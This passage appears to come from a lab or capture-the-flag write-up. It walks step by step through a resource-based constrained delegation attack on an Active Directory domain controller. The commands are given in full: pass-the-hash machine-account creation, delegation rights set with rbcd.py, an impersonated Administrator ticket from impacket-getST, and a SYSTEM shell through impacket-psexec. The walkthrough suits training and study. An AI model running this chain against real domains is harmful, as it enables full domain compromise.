
![Pasted image 20240724195131.png](Evidence/Pasted%20image%2020240724195131.png)


Let’s use our access with the l.livingstone account to create a new machine account on the domain. We can do with by using impacket-addcomputer

```
impacket-addcomputer resourced.local/l.livingstone -dc-ip TARGET -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
```

![Pasted image 20240724195313.png](Evidence/Pasted%20image%2020240724195313.png)

We can verify that this machine account was added to the domain by using our evil-winrm session from before.

```
get-adcomputer attack
```

![Pasted image 20240724195415.png](Evidence/Pasted%20image%2020240724195415.png)

With this account added, we now need a python script to help us manage the delegation rights. Let’s grab a copy of rbcd.py and use it to set msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account.

```
sudo python3 /opt/rbcd-attack/rbcd.py -dc-ip TARGET -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

```

![Pasted image 20240724195614.png](Evidence/Pasted%20image%2020240724195614.png)

We can confirm that this was successful by using our evil-winrm session.

```
Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-
```

We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account.

```
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip TARGET

```

![Pasted image 20240724200051.png](Evidence/Pasted%20image%2020240724200051.png)

This saved the ticket on our Kali host as Administrator.ccache. We need to export a new environment variable named KRB5CCNAME with the location of this

```
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

Now, all we have to do is add a new entry in /etc/hosts to point resourcedc.resourced.local to the target IP address and run impacket-psexec to drop us into a system shell.

```
sudo sh -c 'echo "TARGET resourcedc.resourced.local" >> /etc/hosts'
```

```
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip TARGET
```

![Pasted image 20240724200436.png](Evidence/Pasted%20image%2020240724200436.png)

![Pasted image 20240724200522.png](Evidence/Pasted%20image%2020240724200522.png)

